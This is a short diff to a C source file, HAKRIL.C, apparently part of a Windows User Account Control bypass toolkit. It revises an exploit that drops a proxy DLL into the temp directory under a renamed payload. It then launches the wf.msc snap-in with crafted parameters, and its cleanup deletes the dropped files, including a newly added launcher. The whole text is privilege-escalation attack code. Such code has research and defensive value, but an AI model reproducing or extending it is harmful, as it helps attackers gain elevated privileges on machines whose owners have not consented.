@@ -4,9 +4,9 @@
 *
 *  TITLE:       HAKRIL.C
 *
-*  VERSION:     3.23
+*  VERSION:     3.50
 *
-*  DATE:        18 Dec 2019
+*  DATE:        14 Sep 2020
 *
 *  UAC bypass method from Clement Rouault aka hakril.
 *
@@ -80,12 +80,12 @@ NTSTATUS ucmHakrilMethod(
         }
 
         //
-        // Write Fubuki.exe to the %temp%
+        // Write Fubuki to the %temp%
         //
         RtlSecureZeroMemory(&szBuffer, sizeof(szBuffer));
         _strcpy(szBuffer, g_ctx->szTempDirectory);
         Dummy = _strlen(szBuffer);
-        _strcat(szBuffer, FUBUKI_EXE);
+        _strcat(szBuffer, OSK_EXE);
 
         if (!supWriteBufferToFile(szBuffer, ProxyDll, ProxyDllSize))
             break;
@@ -170,7 +170,7 @@ NTSTATUS ucmHakrilMethod(
         // Prepare snap-in parameters.
         //
 
-        _strcpy(szParams, TEXT("huy32,wf.msc \""));
+        _strcpy(szParams, TEXT("lzx32,wf.msc \""));
         _strcat(szParams, szBuffer);
         _strcat(szParams, TEXT("\""));
 
@@ -239,7 +239,13 @@ BOOL ucmHakrilMethodCleanup(
     _strcat(szBuffer, KAMIKAZE_MSC);
     DeleteFile(szBuffer);
 
+    Sleep(1000);
+
     szBuffer[Dummy] = 0;
-    _strcat(szBuffer, FUBUKI_EXE);
+    _strcat(szBuffer, KAMIKAZE_LAUNCHER);
+    DeleteFile(szBuffer);
+
+    szBuffer[Dummy] = 0;
+    _strcat(szBuffer, OSK_EXE);
     return DeleteFile(szBuffer);
 }
